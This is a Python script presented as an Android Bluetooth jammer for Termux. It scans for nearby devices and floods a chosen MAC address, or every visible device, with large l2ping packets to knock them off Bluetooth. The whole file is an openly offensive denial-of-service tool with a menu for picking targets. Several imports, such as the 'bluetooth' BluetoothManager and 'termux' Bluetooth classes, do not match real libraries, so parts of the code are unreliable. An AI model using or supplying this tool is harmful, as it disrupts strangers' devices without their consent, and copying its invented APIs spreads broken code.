#!/usr/bin/env python3

import sys
import os
import re
import subprocess
from bluetooth import BluetoothManager, BluetoothDevice, BluetoothStatus
from termux import Bluetooth

# ANSI Color Setup
COLORS = {
    "RED": "\033[91m",
    "GREEN": "\033[92m",
    "YELLOW": "\033[93m",
    "CYAN": "\033[96m",
    "MAGENTA": "\033[95m",
    "RESET": "\033[0m",
    "BOLD": "\033[1m"
}

def color_text(text, color):
    return f"{COLORS[color]}{text}{COLORS['RESET']}"

# ASCII Banner
BANNER = f"""
{COLORS['CYAN']}
██████╗ ██╗   ██╗██████╗ ██╗     ██╗   ██╗███████╗██████╗ 
██╔══██╗╚██╗ ██╔╝██╔══██╗██║     ██║   ██║██╔════╝██╔══██╗
██████╔╝ ╚████╔╝ ██████╔╝██║     ██║   ██║█████╗  ██████╔╝
██╔═══╝   ╚██╔╝  ██╔══██╗██║     ██║   ██║██╔══╝  ██╔══██╗
██║        ██║   ██████╔╝███████╗╚██████╔╝███████╗██║  ██║
╚═╝        ╚═╝   ╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
{COLORS['RESET']}
{color_text('ANDROID BLUETOOTH JAMMER', 'MAGENTA')}
{color_text('>> Mobile Edition <<', 'RED')}
"""

class AndroidBluetoothController:
    def __init__(self):
        self.bt_manager = BluetoothManager()
        self.termux_bt = Bluetooth()
        self.check_permissions()
        self.ensure_bluetooth_enabled()

    def check_permissions(self):
        required_perms = {
            "BLUETOOTH": True,
            "BLUETOOTH_ADMIN": True,
            "ACCESS_FINE_LOCATION": True
        }
        
        if not all(self.termux_bt.check_permission(p) for p in required_perms):
            print(color_text("[!] Missing permissions! Enable in Android Settings:", "RED"))
            print(color_text("    - Bluetooth\n    - Location\n    - Nearby Devices", "YELLOW"))
            sys.exit(1)

    def ensure_bluetooth_enabled(self):
        if self.bt_manager.get_state() != BluetoothStatus.STATE_ON:
            print(color_text("[!] Bluetooth is disabled. Enabling...", "YELLOW"))
            self.bt_manager.enable()
            # Wait for Bluetooth to initialize
            import time
            time.sleep(3)
            
            if self.bt_manager.get_state() != BluetoothStatus.STATE_ON:
                print(color_text("[!] Failed to enable Bluetooth!", "RED"))
                sys.exit(1)

    def scan_devices(self):
        print(color_text("\n[+] Scanning with internal Bluetooth...", "CYAN"))
        devices = self.termux_bt.discover()
        return [(d['mac'], d['name']) for d in devices if d]

    def start_jamming(self, target_mac):
        print(color_text(f"\n[+] Initializing attack on {target_mac}", "RED"))
        try:
            # Android-specific low-level access
            subprocess.run(
                ['l2ping', '-i', 'hci0', '-s', '600', '-f', target_mac],
                check=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        except Exception as e:
            print(color_text(f"[!] Attack failed: {str(e)}", "RED"))

def main_menu(controller):
    print(BANNER)
    while True:
        print(color_text("\nMain Menu:", "BOLD"))
        print("1. Scan Devices")
        print("2. Select Target")
        print("3. Attack All")
        print("4. Exit")
        
        choice = input(color_text("\n>> ", "MAGENTA")).strip()
        
        if choice == '1':
            devices = controller.scan_devices()
            if devices:
                print(color_text("\nDiscovered Devices:", "GREEN"))
                for idx, (mac, name) in enumerate(devices, 1):
                    print(f"{idx}. {mac} - {name}")
            else:
                print(color_text("[!] No devices found", "RED"))
        
        elif choice == '2':
            mac = input("Enter target MAC: ").strip()
            if re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', mac):
                controller.start_jamming(mac)
            else:
                print(color_text("[!] Invalid MAC format", "RED"))
        
        elif choice == '3':
            devices = controller.scan_devices()
            if devices:
                for mac, _ in devices:
                    controller.start_jamming(mac)
                print(color_text("\n[+] Attacking all visible devices", "RED"))
        
        elif choice == '4':
            print(color_text("[+] Exiting...", "GREEN"))
            sys.exit(0)
        
        else:
            print(color_text("[!] Invalid choice", "RED"))

if __name__ == "__main__":
    try:
        controller = AndroidBluetoothController()
        main_menu(controller)
    except KeyboardInterrupt:
        print(color_text("\n[+] Attack stopped", "YELLOW"))
        sys.exit(0)
